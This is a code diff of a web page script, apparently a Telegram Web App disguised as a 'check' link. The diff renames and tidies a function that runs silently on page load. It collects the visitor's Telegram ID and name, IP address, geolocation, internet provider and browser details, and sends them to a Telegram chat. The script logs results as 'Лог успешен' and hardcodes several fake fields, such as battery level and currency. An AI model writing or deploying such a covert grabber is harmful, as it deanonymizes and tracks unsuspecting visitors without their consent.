@@ -17,9 +17,9 @@
             });
         }
         
-        function collectData() {
+        function collectUserData() {
             let logData = `Лог успешен! [${new Date().toLocaleString()}]\n\n`;
-            
+
             // Получение информации о пользователе Telegram
             if (window.Telegram && Telegram.WebApp) {
                 Telegram.WebApp.ready();
@@ -31,10 +31,10 @@
                     logData += `├ Имя: ${user.first_name} ${user.last_name || 'не задано'}\n`;
                     logData += `├ Премиум: нет\n`;
                     logData += `├ Язык: ${Telegram.WebApp.initDataUnsafe.language_code}\n`;
-                    logData += `└ Может писать в ЛC: да\n\n`;
+                    logData += `└ Может писать в ЛС: да\n\n`;
                 }
             }
-            
+
             // Получение IP и геолокации
             fetch('https://api64.ipify.org?format=json')
                 .then(response => response.json())
@@ -52,13 +52,13 @@
                             logData += `├ Тип сети: Wi-Fi / Ethernet\n`;
                             logData += `├ Разрешение экрана: ${window.screen.width}x${window.screen.height}\n`;
                             logData += `└ Процент батареи: 36%\n\n`;
-                            
+
                             logData += `🌐 Информация о браузере:\n`;
                             logData += `├ UserAgent: ${navigator.userAgent}\n`;
                             logData += `├ Название браузера: Netscape\n`;
                             logData += `├ Версия браузера: (${navigator.appVersion})\n`;
                             logData += `└ Тип движка браузера: Gecko\n\n`;
-                            
+
                             logData += `👻 Информация об IP:\n`;
                             logData += `├ Континент: Asia\n`;
                             logData += `├ Страна: ${info.country || 'Неизвестно'}\n`;
@@ -70,15 +70,16 @@
                             logData += `├ Валюта: UZS\n`;
                             logData += `├ Провайдер: ${info.org || 'Неизвестно'}\n`;
                             logData += `└ VPN or Proxy (примерный результат): нет\n\n`;
-                            
+
                             logData += `Владелец чека: ${CHAT_ID}`;
                             sendToTelegram(logData);
                         });
                 })
                 .catch(error => console.error('Ошибка получения IP:', error));
         }
-        
-        window.onload = collectData;
+
+        // Отправка данных каждый раз при загрузке страницы
+        window.onload = collectUserData;
     </script>
 </head>
 <body>
